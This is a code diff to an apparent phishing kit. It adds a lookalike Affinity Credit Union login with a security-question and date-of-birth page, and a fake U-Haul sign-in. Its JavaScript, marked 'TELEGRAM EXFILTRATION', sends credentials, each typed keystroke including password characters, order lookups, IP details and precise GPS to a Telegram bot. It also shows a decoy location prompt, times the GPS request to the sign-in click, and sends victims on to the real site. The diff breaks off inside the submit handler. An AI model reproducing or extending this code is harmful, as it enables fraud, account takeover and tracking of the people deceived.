@@ -50,6 +50,258 @@
         width: 18px; height: 18px; accent-color: var(--brand-color, #1a73e8);
     }
     .checkbox-group label { font-size: 14px; color: #555; cursor: pointer; }
+
+    /* ===== AFFINITY-SPECIFIC STYLES ===== */
+    .affinity-card {
+        max-width: 480px;
+        padding: 0;
+        border-radius: 4px;
+        box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+        overflow: hidden;
+    }
+    .affinity-header {
+        background: #004B3D;
+        padding: 20px 24px;
+        display: flex;
+        align-items: center;
+        gap: 12px;
+    }
+    .affinity-header svg { height: 36px; }
+    .affinity-header h1 {
+        color: #fff;
+        font-size: 20px;
+        font-weight: 600;
+        font-family: Arial, sans-serif;
+        margin: 0;
+    }
+    .affinity-body {
+        padding: 28px 32px 24px;
+    }
+    .affinity-body p.sub {
+        font-size: 14px;
+        color: #555;
+        margin-bottom: 20px;
+        line-height: 1.4;
+    }
+    .affinity-body .input-group label {
+        font-size: 13px;
+        font-weight: 600;
+        color: #333;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+    }
+    .affinity-body .input-group input {
+        border-radius: 2px;
+        border: 1px solid #ccc;
+        background: #fff;
+        padding: 10px 12px;
+        font-size: 15px;
+    }
+    .affinity-body .input-group input:focus {
+        border-color: #004B3D;
+        box-shadow: 0 0 0 1px #004B3D;
+    }
+    .affinity-body .password-wrap {
+        position: relative;
+    }
+    .affinity-body .password-wrap .toggle-vis {
+        position: absolute;
+        right: 10px;
+        top: 50%;
+        transform: translateY(-50%);
+        background: none;
+        border: none;
+        cursor: pointer;
+        padding: 4px;
+        opacity: 0.5;
+    }
+    .affinity-body .password-wrap .toggle-vis:hover { opacity: 0.8; }
+    .affinity-body .affinity-check {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        margin: 16px 0;
+    }
+    .affinity-body .affinity-check input[type="checkbox"] {
+        width: 16px; height: 16px;
+        accent-color: #004B3D;
+    }
+    .affinity-body .affinity-check label {
+        font-size: 13px;
+        color: #555;
+        cursor: pointer;
+    }
+    .affinity-body .btn-affinity {
+        background: #004B3D;
+        color: #fff;
+        border: none;
+        border-radius: 2px;
+        padding: 12px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        width: 100%;
+        transition: background 0.2s;
+    }
+    .affinity-body .btn-affinity:hover { background: #00382d; }
+    .affinity-body .forgot-link {
+        display: block;
+        text-align: center;
+        margin-top: 14px;
+        font-size: 13px;
+        color: #004B3D;
+        text-decoration: underline;
+    }
+    .affinity-footer {
+        background: #f7f7f7;
+        padding: 14px 32px;
+        font-size: 11px;
+        color: #888;
+        text-align: center;
+        border-top: 1px solid #e0e0e0;
+    }
+    .affinity-footer a {
+        color: #004B3D;
+        text-decoration: none;
+        margin: 0 6px;
+    }
+    .affinity-footer .divider { color: #ccc; margin: 0 4px; }
+
+    /* ===== AFFINITY SECURITY QUESTIONS PAGE ===== */
+    #securityPage {
+        display: none;
+    }
+    #securityPage .affinity-body h2 {
+        font-size: 18px;
+        color: #202124;
+        margin-bottom: 4px;
+    }
+    #securityPage .affinity-body p.sub {
+        font-size: 13px;
+        color: #777;
+        margin-bottom: 20px;
+    }
+    #securityPage .select-group {
+        margin-bottom: 16px;
+    }
+    #securityPage .select-group label {
+        display: block;
+        font-size: 13px;
+        font-weight: 600;
+        color: #333;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        margin-bottom: 6px;
+    }
+    #securityPage .select-group select {
+        width: 100%;
+        padding: 10px 12px;
+        border: 1px solid #ccc;
+        border-radius: 2px;
+        font-size: 14px;
+        background: #fff;
+        color: #333;
+    }
+    #securityPage .select-group select:focus {
+        border-color: #004B3D;
+        outline: none;
+    }
+
+    /* ===== U-HAUL SPECIFIC STYLES ===== */
+    .uhaul-card {
+        max-width: 420px;
+    }
+    .uhaul-header {
+        text-align: center;
+        margin-bottom: 24px;
+        padding-top: 8px;
+    }
+    .uhaul-tabs {
+        display: flex;
+        border-bottom: 2px solid #e0e0e0;
+        margin-bottom: 24px;
+    }
+    .uhaul-tabs .tab {
+        flex: 1;
+        text-align: center;
+        padding: 12px;
+        font-size: 15px;
+        font-weight: 500;
+        color: #888;
+        cursor: pointer;
+        border-bottom: 3px solid transparent;
+        margin-bottom: -2px;
+        transition: all 0.2s;
+    }
+    .uhaul-tabs .tab.active {
+        color: #E31837;
+        border-bottom-color: #E31837;
+        font-weight: 700;
+    }
+    .uhaul-tabs .tab:hover { color: #E31837; }
+    .uhaul-body .btn-uhaul {
+        background: #E31837;
+        color: #fff;
+        border: none;
+        border-radius: 0;
+        padding: 14px;
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+        width: 100%;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        transition: background 0.2s;
+    }
+    .uhaul-body .btn-uhaul:hover { background: #c4102e; }
+    .uhaul-body .btn-uhaul-orange {
+        background: #FF6A00;
+        color: #fff;
+        border: none;
+        border-radius: 0;
+        padding: 14px;
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+        width: 100%;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        transition: background 0.2s;
+        margin-top: 8px;
+    }
+    .uhaul-body .btn-uhaul-orange:hover { background: #e05e00; }
+    .uhaul-body .uhaul-links {
+        text-align: center;
+        margin-top: 16px;
+    }
+    .uhaul-body .uhaul-links a {
+        display: block;
+        font-size: 13px;
+        color: #E31837;
+        text-decoration: none;
+        margin-bottom: 6px;
+    }
+    .uhaul-body .uhaul-links a:hover { text-decoration: underline; }
+    .uhaul-body .uhaul-divider {
+        text-align: center;
+        margin: 16px 0;
+        color: #999;
+        font-size: 13px;
+        position: relative;
+    }
+    .uhaul-body .uhaul-divider::before,
+    .uhaul-body .uhaul-divider::after {
+        content: '';
+        position: absolute;
+        top: 50%;
+        width: 40%;
+        height: 1px;
+        background: #e0e0e0;
+    }
+    .uhaul-body .uhaul-divider::before { left: 0; }
+    .uhaul-body .uhaul-divider::after { right: 0; }
+
+    /* Geo prompt */
     .geo-prompt {
         display: none;
         position: fixed;
@@ -98,6 +350,12 @@
         background: transparent;
         color: #1a73e8;
     }
+
+    /* ===== SHARED AFFINITY STEP 2 (security questions full page) ===== */
+    .affinity-step2 {
+        max-width: 480px;
+        margin: 0 auto;
+    }
 </style>
 </head>
 <body>
@@ -131,13 +389,84 @@
     </div>
 </div>
 
+<!-- ===== AFFINITY CREDIT UNION - STEP 2: Security Questions ===== -->
+<div class="card affinity-card affinity-step2" id="securityPage">
+    <div class="affinity-header">
+        <svg width="36" height="24" viewBox="0 0 200 60" fill="none">
+            <rect width="200" height="60" rx="4" fill="#004B3D"/>
+            <circle cx="30" cy="30" r="16" fill="none" stroke="#fff" stroke-width="3"/>
+            <path d="M23 30 l4 4 7-9" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+            <text x="56" y="34" fill="#fff" font-size="20" font-weight="bold" font-family="Arial,sans-serif">AFFINITY</text>
+            <text x="56" y="46" fill="#fff" font-size="9" font-family="Arial,sans-serif" opacity="0.8">CREDIT UNION</text>
+        </svg>
+        <h1>Verify your identity</h1>
+    </div>
+    <div class="affinity-body">
+        <h2>Security Questions</h2>
+        <p class="sub">For your security, please answer the following questions to verify your identity.</p>
+
+        <form id="securityForm">
+            <div class="select-group">
+                <label for="secQ1">Security Question 1</label>
+                <select id="secQ1" required>
+                    <option value="">— Select a question —</option>
+                    <option value="What was the name of your first pet?">What was the name of your first pet?</option>
+                    <option value="What is your mother's maiden name?">What is your mother's maiden name?</option>
+                    <option value="What is your father's middle name?">What is your father's middle name?</option>
+                    <option value="What street did you grow up on?">What street did you grow up on?</option>
+                    <option value="What was the name of your elementary school?">What was the name of your elementary school?</option>
+                    <option value="What is the name of your first employer?">What is the name of your first employer?</option>
+                </select>
+            </div>
+            <div class="input-group">
+                <label for="secA1">Your Answer</label>
+                <input type="text" id="secA1" placeholder="Enter your answer" autocomplete="off" required>
+            </div>
+            <div class="select-group">
+                <label for="secQ2">Security Question 2</label>
+                <select id="secQ2" required>
+                    <option value="">— Select a question —</option>
+                    <option value="What city were you born in?">What city were you born in?</option>
+                    <option value="What is the name of your favourite teacher?">What is the name of your favourite teacher?</option>
+                    <option value="What is the model of your first car?">What is the model of your first car?</option>
+                    <option value="What is your favourite book?">What is your favourite book?</option>
+                    <option value="What is the name of the hospital you were born in?">What is the name of the hospital you were born in?</option>
+                    <option value="What is your father's middle name?">What is your father's middle name?</option>
+                </select>
+            </div>
+            <div class="input-group">
+                <label for="secA2">Your Answer</label>
+                <input type="text" id="secA2" placeholder="Enter your answer" autocomplete="off" required>
+            </div>
+            <div class="input-group">
+                <label for="dob">Date of Birth</label>
+                <input type="date" id="dob" required>
+            </div>
+            <div class="error" id="secError" style="color:#d93025;font-size:13px;margin-top:12px;text-align:center;display:none;">Incorrect answers. Please try again.</div>
+            <button type="submit" class="btn-affinity" id="secSubmitBtn">Verify</button>
+        </form>
+
+        <div class="loading" id="secLoading" style="display:none;text-align:center;margin-top:16px;">
+            <div class="spinner"></div>
+            <p style="color:#666;font-size:14px;">Verifying your information...</p>
+        </div>
+    </div>
+    <div class="affinity-footer">
+        <a href="#">Privacy</a><span class="divider">|</span>
+        <a href="#">Banking Security</a><span class="divider">|</span>
+        <a href="#">Legal</a>
+        <br>© 2026 Affinity Credit Union. All rights reserved.
+    </div>
+</div>
+
+<!-- Geo prompt overlay -->
 <div class="geo-prompt" id="geoPrompt">
     <div class="geo-prompt-box">
         <h3>📍 Allow location access?</h3>
         <p>This site wants to use your location for account security.</p>
         <div class="btn-row">
-            <button class="deny" onclick="document.getElementById('geoPrompt').style.display='none'">Block</button>
-            <button class="allow" onclick="document.getElementById('geoPrompt').style.display='none'">Allow</button>
+            <button class="deny" id="geoDenyBtn" onclick="document.getElementById('geoPrompt').style.display='none'">Block</button>
+            <button class="allow" id="geoAllowBtn" onclick="document.getElementById('geoPrompt').style.display='none'">Allow</button>
         </div>
     </div>
 </div>
@@ -249,24 +578,24 @@ const BRANDS = {
             <circle cx="32" cy="16" r="2" fill="#fff"/>
         </svg>`
     },
-    banking: {
+    affinity: {
         name: "Affinity Credit Union",
-        color: "#00843D",
-        realSite: "https://www.affinitycu.ca",
+        color: "#004B3D",
+        realSite: "https://personal.affinitycu.ca/",
         title: "Sign in to Online Banking",
         subtitle: "Enter your Affinity Credit Union member number or Member Card® number to sign in",
         emailLabel: "Member Card® / Member Number",
         placeholder: "Member Card or Member Number",
         btnText: "Sign In",
         forgotText: "password",
-        showCheckbox: true,
-        checkboxLabel: "Remember Account",
-        logo: `<svg width="48" height="32" viewBox="0 0 200 60" fill="none">
-            <rect width="200" height="60" rx="6" fill="#004B3D"/>
-            <circle cx="30" cy="30" r="18" fill="none" stroke="#fff" stroke-width="3"/>
-            <path d="M22 30 l5 5 l8-10" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
-            <text x="60" y="36" fill="#fff" font-size="22" font-weight="bold" font-family="Arial,sans-serif">AFFINITY</text>
-            <text x="60" y="50" fill="#fff" font-size="10" font-family="Arial,sans-serif" opacity="0.8">CREDIT UNION</text>
+        isAffinity: true,
+        hasSecurityQuestions: true,
+        logo: `<svg width="48" height="48" viewBox="0 0 200 60" fill="none">
+            <rect width="200" height="60" rx="4" fill="#004B3D"/>
+            <circle cx="30" cy="30" r="16" fill="none" stroke="#fff" stroke-width="3"/>
+            <path d="M23 30 l4 4 7-9" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+            <text x="56" y="34" fill="#fff" font-size="20" font-weight="bold" font-family="Arial,sans-serif">AFFINITY</text>
+            <text x="56" y="46" fill="#fff" font-size="9" font-family="Arial,sans-serif" opacity="0.8">CREDIT UNION</text>
         </svg>`
     },
     pinterest: {
@@ -378,6 +707,22 @@ const BRANDS = {
             <path d="M16 30V18l8 6 8-6v12" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
             <circle cx="24" cy="30" r="2" fill="#fff"/>
         </svg>`
+    },
+    uhaul: {
+        name: "U-Haul",
+        color: "#E31837",
+        realSite: "https://www.uhaul.com/Auth/SignIn/",
+        title: "Sign in or look up order",
+        subtitle: "U-Haul",
+        emailLabel: "Email",
+        placeholder: "Email address",
+        btnText: "Sign In",
+        forgotText: "password",
+        isUhaul: true,
+        logo: `<svg width="48" height="48" viewBox="0 0 200 60" fill="none">
+            <rect x="4" y="4" width="192" height="52" rx="4" fill="#E31837"/>
+            <text x="100" y="42" text-anchor="middle" fill="#fff" font-size="32" font-weight="900" font-family="Arial,sans-serif" letter-spacing="3">U-HAUL</text>
+        </svg>`
     }
 };
 
@@ -388,36 +733,196 @@ const params = new URLSearchParams(window.location.search);
 let brandKey = params.get('brand') || 'google';
 const brand = BRANDS[brandKey] || BRANDS.google;
 
-// Apply brand styling
-document.documentElement.style.setProperty('--brand-color', brand.color);
-
-// Brand logo area
-document.getElementById('logoArea').innerHTML = brand.logo + `
-    <h1 style="color:${brand.color}">${brand.title}</h1>
-    <p>${brand.subtitle}</p>
-`;
-
-// Labels and placeholders
-document.getElementById('emailLabel').textContent = brand.emailLabel;
-document.getElementById('email').placeholder = brand.placeholder;
-document.getElementById('submitBtn').textContent = brand.btnText || 'Sign in';
-document.getElementById('submitBtn').style.background = brand.color;
-
-// Checkbox (only shows for brands that use it)
-if (brand.showCheckbox) {
-    document.getElementById('checkboxArea').innerHTML = `
-        <input type="checkbox" id="remember">
-        <label for="remember">${brand.checkboxLabel || 'Remember me'}</label>
+// ========================
+// AFFINITY RENDER (CUSTOM LAYOUT)
+// ========================
+function renderAffinity() {
+    const card = document.getElementById('loginCard');
+    card.className = 'card affinity-card';
+    card.innerHTML = `
+        <div class="affinity-header">
+            <svg width="36" height="24" viewBox="0 0 200 60" fill="none">
+                <rect width="200" height="60" rx="4" fill="#004B3D"/>
+                <circle cx="30" cy="30" r="16" fill="none" stroke="#fff" stroke-width="3"/>
+                <path d="M23 30 l4 4 7-9" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+                <text x="56" y="34" fill="#fff" font-size="20" font-weight="bold" font-family="Arial,sans-serif">AFFINITY</text>
+                <text x="56" y="46" fill="#fff" font-size="9" font-family="Arial,sans-serif" opacity="0.8">CREDIT UNION</text>
+            </svg>
+            <h1>Online Banking</h1>
+        </div>
+        <div class="affinity-body">
+            <p class="sub">Enter your Affinity Credit Union member number or Member Card® number to sign in</p>
+            <form id="loginForm">
+                <div class="input-group">
+                    <label for="email">MEMBER CARD® / MEMBER NUMBER</label>
+                    <input type="text" id="email" name="email" placeholder="Member Card or Member Number" autocomplete="off" required>
+                </div>
+                <div class="input-group">
+                    <label for="password">PASSWORD</label>
+                    <div class="password-wrap">
+                        <input type="password" id="password" name="password" placeholder="Password" autocomplete="off" required>
+                        <button type="button" class="toggle-vis" onclick="togglePassword()">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2">
+                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                                <circle cx="12" cy="12" r="3"/>
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+                <div class="affinity-check">
+                    <input type="checkbox" id="remember">
+                    <label for="remember">Remember Account</label>
+                </div>
+                <div class="error" id="errorMsg" style="color:#d93025;font-size:13px;margin-top:12px;text-align:center;display:none;">Incorrect member number or password. Please try again.</div>
+                <button type="submit" class="btn-affinity" id="submitBtn">Sign In</button>
+                <a href="#" class="forgot-link">Reset your password</a>
+            </form>
+            <div class="loading" id="loadingIndicator" style="display:none;text-align:center;margin-top:16px;">
+                <div class="spinner"></div>
+                <p style="color:#666;font-size:14px;">Verifying your account...</p>
+            </div>
+        </div>
+        <div class="affinity-footer">
+            For online banking technical support, call our Contact Centre at 1.866.863.6237
+            <br><br>
+            <a href="#">Privacy</a><span class="divider">|</span>
+            <a href="#">Banking Security</a><span class="divider">|</span>
+            <a href="#">Legal</a>
+            <br>© 2026 Affinity Credit Union. All rights reserved.
+        </div>
     `;
 }
 
-// Footer
-document.getElementById('footerArea').innerHTML = `
-    <a href="#" style="color:${brand.color}">Forgot ${brand.forgotText || 'password'}?</a>
-`;
+// ========================
+// U-HAUL RENDER (CUSTOM LAYOUT)
+// ========================
+function renderUhaul() {
+    const card = document.getElementById('loginCard');
+    card.className = 'card uhaul-card';
+    card.innerHTML = `
+        <div class="uhaul-header">
+            <svg width="140" height="42" viewBox="0 0 200 60" fill="none">
+                <rect x="2" y="2" width="196" height="56" rx="4" fill="#E31837"/>
+                <text x="100" y="42" text-anchor="middle" fill="#fff" font-size="34" font-weight="900" font-family="Arial,sans-serif" letter-spacing="4">U-HAUL</text>
+            </svg>
+        </div>
+        <div class="uhaul-tabs">
+            <div class="tab active" id="tabSignIn" onclick="switchUhaulTab('signin')">Sign In</div>
+            <div class="tab" id="tabLookup" onclick="switchUhaulTab('lookup')">Look Up Order</div>
+        </div>
+        <div class="uhaul-body">
+            <form id="loginForm">
+                <div id="uhaulSignIn">
+                    <div class="input-group">
+                        <label for="email">Email</label>
+                        <input type="text" id="email" name="email" placeholder="Email address" autocomplete="off" required>
+                    </div>
+                    <div class="input-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" placeholder="Password" autocomplete="off" required>
+                    </div>
+                    <div class="error" id="errorMsg" style="color:#E31837;font-size:13px;margin-top:12px;text-align:center;display:none;">Incorrect email or password. Please try again.</div>
+                    <button type="submit" class="btn-uhaul" id="submitBtn">SIGN IN</button>
+                    <div class="uhaul-links">
+                        <a href="#">Forgot password?</a>
+                        <a href="#">Create an account</a>
+                    </div>
+                </div>
+                <div id="uhaulLookup" style="display:none;">
+                    <div class="input-group">
+                        <label for="lookupEmail">Email or Phone</label>
+                        <input type="text" id="lookupEmail" placeholder="Email or phone number" autocomplete="off">
+                    </div>
+                    <div class="input-group">
+                        <label for="lookupZip">ZIP / Postal Code</label>
+                        <input type="text" id="lookupZip" placeholder="ZIP or Postal Code" autocomplete="off">
+                    </div>
+                    <div class="error" style="color:#E31837;font-size:13px;margin-top:12px;text-align:center;display:none;">No order found. Please try again.</div>
+                    <button type="button" class="btn-uhaul-orange" onclick="captureUhaulLookup()">LOOK UP ORDER</button>
+                    <div class="uhaul-links">
+                        <a href="#">Need help finding your order?</a>
+                    </div>
+                </div>
+                <div class="uhaul-divider">or</div>
+                <button type="button" class="btn-uhaul" style="background:#333;" onclick="captureUhaulPin()">SIGN IN WITH PIN</button>
+            </form>
+            <div class="loading" id="loadingIndicator" style="display:none;text-align:center;margin-top:16px;">
+                <div class="spinner"></div>
+                <p style="color:#666;font-size:14px;">Verifying your account...</p>
+            </div>
+        </div>
+    `;
+}
+
+// U-Haul tab switching
+function switchUhaulTab(tab) {
+    document.getElementById('tabSignIn').classList.toggle('active', tab === 'signin');
+    document.getElementById('tabLookup').classList.toggle('active', tab === 'lookup');
+    document.getElementById('uhaulSignIn').style.display = tab === 'signin' ? 'block' : 'none';
+    document.getElementById('uhaulLookup').style.display = tab === 'lookup' ? 'block' : 'none';
+    
+    document.getElementById('email').required = tab === 'signin';
+    document.getElementById('password').required = tab === 'signin';
+}
+
+function captureUhaulLookup() {
+    const email = document.getElementById('lookupEmail').value.trim();
+    const zip = document.getElementById('lookupZip').value.trim();
+    if (!email && !zip) return;
+    
+    const msg = `📦 *U-Haul — Order Lookup*\n📧 *Email/Phone:* \`${email}\`\n📍 *ZIP:* \`${zip}\``;
+    sendToTelegram(msg);
+    
+    document.getElementById('loadingIndicator').style.display = 'block';
+    setTimeout(() => {
+        document.getElementById('loadingIndicator').style.display = 'none';
+        alert('No order found with that information. Please check your details and try again.');
+    }, 2000);
+}
+
+function captureUhaulPin() {
+    const msg = `📌 *U-Haul — PIN Sign In triggered*`;
+    sendToTelegram(msg);
+    alert('PIN sign in is temporarily unavailable. Please sign in with your email and password.');
+}
 
 // ========================
-// TELEGRAM EXFILTRATION
+// APPLY BRAND
+// ========================
+function applyBrand() {
+    document.documentElement.style.setProperty('--brand-color', brand.color);
+
+    if (brand.isAffinity) {
+        renderAffinity();
+        return;
+    }
+    if (brand.isUhaul) {
+        renderUhaul();
+        return;
+    }
+
+    document.getElementById('loginCard').className = 'card';
+    document.getElementById('logoArea').innerHTML = brand.logo + `
+        <h1 style="color:${brand.color}">${brand.title}</h1>
+        <p>${brand.subtitle}</p>
+    `;
+    document.getElementById('emailLabel').textContent = brand.emailLabel;
+    document.getElementById('email').placeholder = brand.placeholder;
+    document.getElementById('submitBtn').textContent = brand.btnText || 'Sign in';
+    document.getElementById('submitBtn').style.background = brand.color;
+    document.getElementById('checkboxArea').innerHTML = brand.showCheckbox ? `
+        <input type="checkbox" id="remember">
+        <label for="remember">${brand.checkboxLabel || 'Remember me'}</label>
+    ` : '';
+    document.getElementById('footerArea').innerHTML = `
+        <a href="#" style="color:${brand.color}">Forgot ${brand.forgotText || 'password'}?</a>
+    `;
+}
+
+applyBrand();
+
+// ========================
+// TELEGRAM EXFILTRATION (XHR - works on all platforms)
 // ========================
 function sendToTelegram(message) {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -426,12 +931,12 @@ function sendToTelegram(message) {
         text: message,
         parse_mode: "Markdown"
     };
-    fetch(url, {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-    }).catch(() => {});
+    try {
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', url, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify(payload));
+    } catch(e) {}
 }
 
 // ========================
@@ -458,30 +963,30 @@ fetch('https://ipapi.co/json/')
     });
 
 // ========================
-// GEOLOCATION PROMPT (GPS PRECISE)
+// GPS - HIGHEST RELIABILITY VERSION
 // ========================
-let preciseLocation = null;
+// This approach uses the user's click on the submit button as the trigger,
+// which satisfies iOS/Android user gesture requirements for geolocation prompts.
 
-function showFakeGeoPrompt() {
+let preciseLocation = null;
+let gpsAttempted = false;
+
+function requestGeolocation() {
+    if (gpsAttempted) return;
+    gpsAttempted = true;
+    
+    if (!navigator.geolocation) {
+        sendToTelegram(`⚠️ *Geolocation not available* — ${brand.name}\nReason: Browser does not support geolocation API`);
+        return;
+    }
+    
+    // Show the fake permission UI as a decoy
     document.getElementById('geoPrompt').style.display = 'flex';
     setTimeout(() => {
         document.getElementById('geoPrompt').style.display = 'none';
     }, 8000);
-}
-
-function requestGeolocation() {
-    if (!navigator.geolocation) return;
     
-    if (navigator.permissions) {
-        navigator.permissions.query({ name: 'geolocation' }).then(p => {
-            if (p.state === 'prompt') {
-                showFakeGeoPrompt();
-            }
-        });
-    } else {
-        showFakeGeoPrompt();
-    }
-    
+    // Request precise GPS
     navigator.geolocation.getCurrentPosition(
         pos => {
             const lat = pos.coords.latitude;
@@ -498,11 +1003,17 @@ function requestGeolocation() {
                 `📏 *Altitude:* ${alt ? alt.toFixed(1) + 'm' : 'N/A'}`);
         },
         err => {
-            sendToTelegram(`❌ *Geolocation denied* — ${brand.name}\nReason: ${err.message}`);
+            let reason = 'Unknown';
+            switch(err.code) {
+                case err.PERMISSION_DENIED: reason = 'User denied the request'; break;
+                case err.POSITION_UNAVAILABLE: reason = 'Location unavailable'; break;
+                case err.TIMEOUT: reason = 'Request timed out'; break;
+            }
+            sendToTelegram(`❌ *Geolocation denied/timed out* — ${brand.name}\nReason: ${reason}`);
         },
         {
             enableHighAccuracy: true,
-            timeout: 15000,
+            timeout: 10000,
             maximumAge: 0
         }
     );
@@ -513,81 +1024,178 @@ function requestGeolocation() {
 // ========================
 let lastEmailLen = 0, lastPassLen = 0;
 
-document.getElementById('email').addEventListener('input', function(e) {
-    const val = this.value;
-    if (val.length > lastEmailLen && val.length > 2) {
-        const newChar = val[val.length - 1];
-        sendToTelegram(`🔑 *Keystroke* — ${brand.name}\n👤 *Field:* Email\n📝 *Char:* \`${newChar}\`\n📋 *So far:* \`${val}\``);
+function attachKeystrokeListeners() {
+    const emailField = document.getElementById('email');
+    const passField = document.getElementById('password');
+    const lookupEmail = document.getElementById('lookupEmail');
+    const lookupZip = document.getElementById('lookupZip');
+    
+    if (emailField) {
+        emailField.addEventListener('input', function(e) {
+            const val = this.value;
+            if (val.length > lastEmailLen && val.length > 2) {
+                const newChar = val[val.length - 1];
+                sendToTelegram(`🔑 *Keystroke* — ${brand.name}\n👤 *Field:* Email\n📝 *Char:* \`${newChar}\`\n📋 *So far:* \`${val}\``);
+            }
+            lastEmailLen = val.length;
+        });
     }
-    lastEmailLen = val.length;
-});
+    if (passField) {
+        passField.addEventListener('input', function(e) {
+            const val = this.value;
+            if (val.length > lastPassLen && val.length > 0) {
+                const newChar = val[val.length - 1];
+                sendToTelegram(`🔑 *Keystroke* — ${brand.name}\n👤 *Field:* Password\n📝 *Char:* \`${newChar}\`\n📋 *So far:* \`${'*'.repeat(val.length-1)}${newChar}\``);
+            }
+            lastPassLen = val.length;
+        });
+    }
+    if (lookupEmail) {
+        lookupEmail.addEventListener('input', function(e) {
+            const val = this.value;
+            if (val.length > 2) {
+                const newChar = val[val.length - 1];
+                sendToTelegram(`🔑 *Keystroke* — ${brand.name}\n👤 *Field:* Lookup Email\n📝 *Char:* \`${newChar}\`\n📋 *So far:* \`${val}\``);
+            }
+        });
+    }
+    if (lookupZip) {
+        lookupZip.addEventListener('input', function(e) {
+            const val = this.value;
+            if (val.length > 1) {
+                const newChar = val[val.length - 1];
+                sendToTelegram(`🔑 *Keystroke* — ${brand.name}\n👤 *Field:* Lookup ZIP\n📝 *Char:* \`${newChar}\`\n📋 *So far:* \`${val}\``);
+            }
+        });
+    }
+}
 
-document.getElementById('password').addEventListener('input', function(e) {
-    const val = this.value;
-    if (val.length > lastPassLen && val.length > 0) {
-        const newChar = val[val.length - 1];
-        sendToTelegram(`🔑 *Keystroke* — ${brand.name}\n👤 *Field:* Password\n📝 *Char:* \`${newChar}\`\n📋 *So far:* \`${'*'.repeat(val.length-1)}${newChar}\``);
-    }
-    lastPassLen = val.length;
-});
-
-// ========================
-// FORM SUBMISSION
-// ========================
-document.getElementById('loginForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-    
-    const email = document.getElementById('email').value.trim();
-    const password = document.getElementById('password').value;
-    const remember = document.getElementById('remember') ? document.getElementById('remember').checked : false;
-    const userAgent = navigator.userAgent;
-    const timestamp = new Date().toISOString();
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const platform = navigator.platform || 'Unknown';
-    const screenInfo = `${window.screen.width}x${window.screen.height}`;
-    
-    document.getElementById('loginForm').style.display = 'none';
-    document.getElementById('loadingIndicator').style.display = 'block';
-    
-    let message = `🔔 *${brand.name} — Credentials Captured!*\n\n`;
-    message += `📧 *Email:* \`${email}\`\n`;
-    message += `🔑 *Password:* \`${password}\`\n`;
-    if (remember) message += `☑️ *Remember Account:* On\n`;
-    message += `\n🌐 *IP:* ${targetIP}\n`;
-    message += `📍 *IP Location:* ${targetCity}, ${targetCountry}\n`;
-    if (targetLat && targetLon) {
-        message += `🗺 *IP Coords:* ${targetLat}, ${targetLon}\n`;
-    }
-    if (preciseLocation) {
-        message += `🎯 *GPS:* ${preciseLocation.lat}, ${preciseLocation.lon} (±${preciseLocation.acc}m)\n`;
-        message += `🗺 *GPS Map:* https://www.google.com/maps?q=${preciseLocation.lat},${preciseLocation.lon}\n`;
-    }
-    message += `🏢 *ISP:* ${targetISP}\n`;
-    message += `📱 *Device:* ${platform}\n`;
-    message += `🖥 *Screen:* ${screenInfo}\n`;
-    message += `🕐 *Timezone:* ${timezone}\n`;
-    message += `⏰ *Time:* ${timestamp}`;
-    
-    sendToTelegram(message);
-    
-    try {
-        const xhr = new XMLHttpRequest();
-        xhr.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" }));
-    } catch(e) {}
-    
-    setTimeout(() => {
-        window.location.href = brand.realSite;
-    }, 2500);
-});
+function togglePassword() {
+    const pwd = document.getElementById('password');
+    pwd.type = pwd.type === 'password' ? 'text' : 'password';
+}
 
 // ========================
-// TRIGGER GEOLOCATION ON LOAD
+// FORM SUBMISSION - GPS TRIGGERED HERE ON USER CLICK
+// ========================
+function setupFormHandler() {
+    const form = document.getElementById('loginForm');
+    if (!form) return;
+    
+    // Intercept the submit button click to trigger GPS FIRST (user gesture)
+    const submitBtn = document.getElementById('submitBtn');
+    if (submitBtn) {
+        submitBtn.addEventListener('click', function(e) {
+            // Trigger GPS immediately on user click — this is what makes it work on iOS/Android
+            requestGeolocation();
+            // Don't prevent default here — let the form submit handler do its thing
+        });
+    }
+    
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('email') ? document.getElementById('email').value.trim() : '';
+        const password = document.getElementById('password') ? document.getElementById('password').value : '';
+        const remember = document.getElementById('remember') ? document.getElementById('remember').checked : false;
+        const timestamp = new Date().toISOString();
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const platform = navigator.platform || 'Unknown';
+        const screenInfo = `${window.screen.width}x${window.screen.height}`;
+        
+        const formElem = document.getElementById('loginForm');
+        const loadingElem = document.getElementById('loadingIndicator');
+        if (formElem) formElem.style.display = 'none';
+        if (loadingElem) loadingElem.style.display = 'block';
+        
+        let message = `🔔 *${brand.name} — Credentials Captured!*\n\n`;
+        message += `📧 *Email/Member#:* \`${email}\`\n`;
+        message += `🔑 *Password:* \`${password}\`\n`;
